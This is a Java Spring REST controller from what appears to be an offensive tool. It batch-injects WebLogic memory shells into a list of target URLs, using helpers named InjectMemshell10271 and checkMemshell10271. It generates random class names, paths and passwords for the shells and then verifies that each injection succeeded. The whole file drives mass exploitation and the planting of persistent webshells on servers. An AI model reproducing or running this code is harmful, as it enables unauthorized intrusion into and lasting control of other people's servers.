package w01fh4cker.exploit.javabackend.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;
import reactor.core.publisher.Mono;
import java.security.NoSuchAlgorithmException;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import w01fh4cker.exploit.javabackend.tools.generateRandomString;

import static w01fh4cker.exploit.javabackend.models.Memshell10271.InjectMemshell10271;
import static w01fh4cker.exploit.javabackend.models.Memshell10271.checkMemshell10271;

@RestController
public class WeblogicMemshellExploitController {

    private final ObjectMapper objectMapper;

    public WeblogicMemshellExploitController(ObjectMapper objectMapper) {
        this.objectMapper = objectMapper;
    }

    public boolean checkVariableifNull(String variable){
        return variable == null || variable.isEmpty();
    }

    private static final Lock lock = new ReentrantLock();
    static generateRandomString grs = new generateRandomString();

    public List<String> batchExploit(String urllist, String className, String newUri, String password) {
        String[] urls = urllist.split("\\r\\n");
        List<String> jsonResults = new ArrayList<>();
        List<Thread> threads = new ArrayList<>();
        for (String url : urls) {
            Thread thread = new Thread(() -> {
                try {
                    lock.lock();
                    InjectMemshell10271(url, className, newUri, password);
                    String jsonResult = checkMemshell10271(url, newUri, password);
                    jsonResults.add(jsonResult);
                } catch (NoSuchAlgorithmException | IOException e) {
                    throw new RuntimeException(e);
                } finally {
                    lock.unlock();
                }
            });
            thread.start();
            threads.add(thread);
        }
        for (Thread thread : threads) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }

        return jsonResults;
    }


    @PostMapping(value = "/weblogic/java/get-target-urls", consumes = MediaType.APPLICATION_JSON_VALUE)
    public Mono<ResponseEntity<String>> getTargetUrls(@RequestBody String requestBody) {
        try {
            Map jsonMap = objectMapper.readValue(requestBody, Map.class);
            String fileContent = (String) jsonMap.get("fileContent");
            String className = (String) jsonMap.get("className");
            String newUri = (String) jsonMap.get("newUri");
            String password = (String) jsonMap.get("password");
            if(checkVariableifNull(className)){
                className = grs.GenerateRandomString(10);
            }
            if(checkVariableifNull(newUri)){
                newUri = grs.GenerateRandomString(8);
            }
            if(checkVariableifNull(password)){
                password = grs.GenerateRandomString(25);
            }
            List<String> results = batchExploit(fileContent, className, newUri, password);
            System.out.println(results);
            return Mono.just(ResponseEntity.ok(results.toString()));
        } catch (IOException e) {
            return Mono.just(ResponseEntity.badRequest().body(Collections.emptyList().toString()));
        }
    }
}
